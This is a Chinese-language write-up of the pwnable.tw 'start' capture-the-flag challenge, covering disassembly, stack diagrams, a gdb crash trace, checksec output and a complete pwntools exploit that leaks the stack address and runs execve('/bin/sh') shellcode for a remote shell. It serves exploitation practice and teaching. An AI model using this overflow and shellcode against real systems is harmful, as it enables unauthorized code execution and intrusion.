我觉得我住在了start...

### debug

```sh
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped

$ strace ./start
execve("./start", ["./start"], 0x7ffc871d4590 /* 62 vars */) = 0
strace: [ Process PID=90877 runs in 32 bit mode. ]
write(1, "Let's start the CTF:", 20Let's start the CTF:)    = 20
read(0, AAAA
"AAAA\n", 60)                   = 5
exit(0)                                 = ?
+++ exited with 0 +++
```
**strace: **对程序的系统调用和信号传递的跟踪结果来对程序进行分析，以达到解决问题或者是了解程序工作过程的目的。
```sh
$ objdump -M intel -d ./start

./start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d        # ret address <_exit>
 8048066:	31 c0                	xor    eax,eax          # Initialize value 0 to eax, ebx, ecx, edx
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx           
 804806e:	68 43 54 46 3a       	push   0x3a465443       # Push 20 bytes in to stack
 8048073:	68 74 68 65 20       	push   0x20656874       # (Value is "Let’s start the CTF:")
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14          # buf_size = 20 bytes
 804808b:	b3 01                	mov    bl,0x1           
 804808d:	b0 04                	mov    al,0x4           # Call system call "write" al = 0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx          # Initialize value 0 to ebx
 8048093:	b2 3c                	mov    dl,0x3c          # buf_size = 60 bytes
 8048095:	b0 03                	mov    al,0x3           # Call system call "read" al = 0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14         # Add 20 bytes of address in esp
 804809c:	c3                   	ret                     # Call ret instruction (eip = 0x0804809d)

0804809d <_exit>:
 804809d:	5c                   	pop    esp              # Call _exit function
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80

```
sys_write
输出14h字节数据：Let’s start the CTF:
```sh
   +-----------------+      <----
    |       Let’      |         |     
    +-----------------+         |
    |       s st      |         |
    +-----------------+         |
    |       art       |        14h
    +-----------------+         |
    |       the       |         |
    +-----------------+         |
    |       CTF:      |         |
    +-----------------+      <-----
    |   offset _exit  |
    +-----------------+
    |    Saved ESP    |
H-> +-----------------+
```

sys_read
read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp
```sh
 +-----------------+      <----
    |       aaaa      |         |     
    +-----------------+         |
    |       aaaa      |         |
    +-----------------+         |
    |       aaaa      |        14h
    +-----------------+         |
    |       aaaa      |         |
    +-----------------+         |
    |       aaaa      |         |
    +-----------------+      <-----
    |       aaaa      |      # ret addr
    +-----------------+
    |    Saved ESP    |      # esp
H-> +-----------------+

```

可以通过“0x14+Addr”跳转想要的地址

**objdump:** 对目标文件（obj）或可执行文件进行反汇编，是一种可阅读格式的二进制文件。

```sh
objdump -M intel -d ./start
# -M -m machine   --architecture=machine  指定反汇编目标文件时使用的架构。当待反汇编的目标文件其本身并没有包含arch信息时(如S-records文件)，我们就可以使用此选项来进行指定。我们可以使用objdump 
#-i来列出所支持的arch。
# -d  --disassemble    从objfile中对机器指令进行反汇编。本选项只对那些包含指令的section进行反汇编。
```

Try it with gdb
```sh
$ python -c "print(0x14*'A'+'BBBB')"
AAAAAAAAAAAAAAAAAAAABBBB

$ gdb -q ./start
pwndbg: loaded 191 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./start...(no debugging symbols found)...done.

pwndbg> r
Starting program: /mnt/hgfs/pwn/pwnable/start/start 
Let's start the CTF:AAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS ]────────────────────────────────────
 EAX  0x19
 EBX  0x0
 ECX  0xffffd0c4 ◂— 0x41414141 ('AAAA')
 EDX  0x3c
 EDI  0x0
 ESI  0x0
 EBP  0x0
 ESP  0xffffd0dc —▸ 0xffffd00a ◂— 0x0
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────[ DISASM ]─────────────────────────────────────
Invalid address 0x42424242





─────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ esp 0xffffd0dc —▸ 0xffffd00a ◂— 0x0
01:0004│     0xffffd0e0 ◂— 0x1
02:0008│     0xffffd0e4 —▸ 0xffffd2bb ◂— '/mnt/hgfs/pwn/pwnable/start/start'
03:000c│     0xffffd0e8 ◂— 0x0
04:0010│     0xffffd0ec —▸ 0xffffd2dd ◂— 'CLUTTER_IM_MODULE=xim'
05:0014│     0xffffd0f0 —▸ 0xffffd2f3 ◂— 0x435f534c ('LS_C')
06:0018│     0xffffd0f4 —▸ 0xffffd8df ◂— 'LC_MEASUREMENT=zh_CN.UTF-8'
07:001c│     0xffffd0f8 —▸ 0xffffd8fa ◂— 'LESSCLOSE=/usr/bin/lesspipe %s %s'
───────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► f 0 0x42424242
────────────────────────────────────────────────────────────────────────────────────
```

准备checksec，结果不小心把pwntools删了，安装pwntools和checksec都是人间玄学。
在peda里看NX是开了，直接看checksec，NX并没有开（神奇）

```sh
checksec start
[*] '/mnt/hgfs/pwn/pwnable/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found  
    NX:       NX disabled
    PIE:      No PIE (0x8048000)

```

NX没开，所以可以在栈上执行代码

### writeup

1. Launch ./start
2. Overflow and output esp address with “0x8048087”(mov ecx,esp) 用write函数输出栈地址
3. Add 0x14 + shellcode
4. Execute shellcode

```py
# coding: utf-8
from pwn import *

# set target environment
context.arch      = 'i386'
context.os        = 'linux'
# context.word_size = 32

# context.log_level = "debug" # 打印调试信息
# context.log_level = "error" # 打印错误信息, 此时很多回显就看不到了


debug=0
if debug:
    p=process('./start')
    # p=process('',env={'LD_PRELOAD':'./libc.so'}) # 绑定libc
    context.log_level='debug'
    gdb.attach(p)
else:
    p=remote('chall.pwnable.tw', 10000)

# generate shellcode
shell_code = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

# stage 1 : leak stack address
log.info('Pwning start:')
p.recvuntil(':')
payload_1 = b'A' * 0x14 + p32(0x08048087)
p.send(payload_1)

# save addr
esp_addr = u32(p.recv(4))

# stage 2
payload_2 = b'a' * 0x14   # write函数的参数
payload_2 += p32(esp_addr +0x14)  # esp+0x14 是ret_addr的位置
payload_2 += shell_code    # 

p.send(payload_2)

p.interactive()

```

### tips

系统调用的过程可以总结如下：
1． 执行用户程序(如:fork)
2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。
3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）
4． 进行中断处理，根据系统调用表调用内核函数。
5． 执行内核函数。
6． 执行RESTORE_ALL并返回用户模式
Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。

系统调用号

```vim
#define __NR_exit                 1
#define __NR_fork                 2
#define __NR_read                 3
#define __NR_write                4
#define __NR_open                 5
#define __NR_close                6
#define __NR_waitpid              7
#define __NR_creat                8
#define __NR_link                 9
#define __NR_unlink              10
#define __NR_execve              11
```

切换peda和pwndbg
```sh
$ vim ~/.gdbinit
```





### reference link

- [Linux 命令（137）—— strace 命令](https://cloud.tencent.com/developer/article/1613202)
- [pwnable.tw start writeup](https://medium.com/yuru-sec/pwnable-tw-start-writeup-470acb6e353a)
- [linux程序的常用保护机制](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)
- https://hackmd.io/@duckie/start_pwnabletw
- https://v1ckydxp.github.io/2019/04/24/pwnable-tw-start-writeup/
- https://cool-y.github.io/2019/10/25/PWNtw-start/https://cloud.tencent.com/developer/article/1613202